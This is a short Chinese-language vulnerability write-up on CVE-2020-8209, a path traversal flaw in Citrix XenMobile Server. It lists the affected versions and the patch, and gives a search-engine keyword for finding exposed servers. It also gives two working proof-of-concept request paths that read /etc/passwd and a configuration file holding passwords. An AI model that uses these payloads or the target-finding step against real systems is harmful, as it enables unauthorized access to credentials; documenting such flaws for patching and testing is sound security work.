1、漏洞介绍

XenMobile是Citrix开发的企业移动性管理软件，该产品允许企业管理员工的移动设备和移动应用程序，该软件的目的是通过允许员工安全地在企业拥有的和个人移动设备及应用程序上工作来提高生产率。CVE-2020-8209，路径遍历漏洞。此漏洞允许未经授权的用户读取任意文件，包括包含密码的配置文件。（该软件国外居多，国内基本很少）

2、漏洞版本

RP2之前的XenMobile服务器10.12  
RP4之前的XenMobile服务器10.11  
RP6之前的XenMobile服务器10.10  
10.9 RP5之前的XenMobile服务器

3、漏洞复现

1.通过空间引擎关键字

 **"XenMobile控制台"**

![1605608855_5fb3a597dc38873de87ad.png!small](https://image.3001.net/images/20201117/1605608855_5fb3a597dc38873de87ad.png!small)

2.POC验证漏洞

 **/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd**

 **/jsp/help-sb-download.jsp?sbFileName=../../../opt/sas/sw/config/sftu.properties**

![1605608659_5fb3a4d399a0543d3f6a7.png!small](https://image.3001.net/images/20201117/1605608659_5fb3a4d399a0543d3f6a7.png!small)

![1605608731_5fb3a51bb19f9c77b1996.png!small](https://image.3001.net/images/20201117/1605608731_5fb3a51bb19f9c77b1996.png!small)

4、漏洞建议

官方补丁删除了/opt/sas/sw/tomcat/inst1/webapps/ROOT/jsp/help-sb-download.jsp

5、参考链接

https://mp.weixin.qq.com/s/tZXp1zTlfas7makYcgZusw

